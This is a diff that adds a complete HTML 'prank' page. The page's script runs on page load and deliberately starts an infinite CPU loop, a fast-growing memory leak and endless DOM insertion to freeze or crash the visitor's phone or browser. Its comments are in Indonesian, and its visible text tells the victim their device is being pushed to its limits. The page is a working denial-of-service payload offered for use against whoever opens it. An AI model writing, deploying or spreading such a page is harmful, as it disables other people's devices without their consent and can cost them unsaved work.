@@ -1,0 +1,53 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Heavy Mobile Prank</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            text-align: center;
+            padding: 50px;
+        }
+    </style>
+    <script>
+        // Fungsi untuk infinite loop yang sangat berat
+        function infiniteLoop() {
+            while (true) {
+                // Loop tak terbatas yang membebani CPU
+            }
+        }
+
+        // Fungsi untuk menyebabkan memory leak
+        function memoryLeak() {
+            var arr = [];
+            setInterval(function() {
+                arr.push(new Array(1000000).join('X')); // Menambahkan string besar terus menerus ke array
+            }, 1); // Setiap 1 milidetik
+        }
+
+        // Fungsi untuk menambahkan elemen DOM secara terus-menerus
+        function domManipulation() {
+            setInterval(function() {
+                var newDiv = document.createElement("div");
+                newDiv.style.width = "100%";
+                newDiv.style.height = "10px";
+                newDiv.style.backgroundColor = "#f00";
+                document.body.appendChild(newDiv); // Menambahkan elemen terus menerus
+            }, 1); // Tambah elemen setiap milidetik
+        }
+
+        // Eksekusi semua fungsi prank secara bersamaan
+        window.onload = function() {
+            infiniteLoop();        // Memulai infinite loop
+            memoryLeak();          // Memulai memory leak
+            domManipulation();     // Memulai penambahan elemen DOM
+        };
+    </script>
+</head>
+<body>
+    <h1>You're in Trouble!</h1>
+    <p>This prank is pushing your device to its limits...</p>
+</body>
+</html>
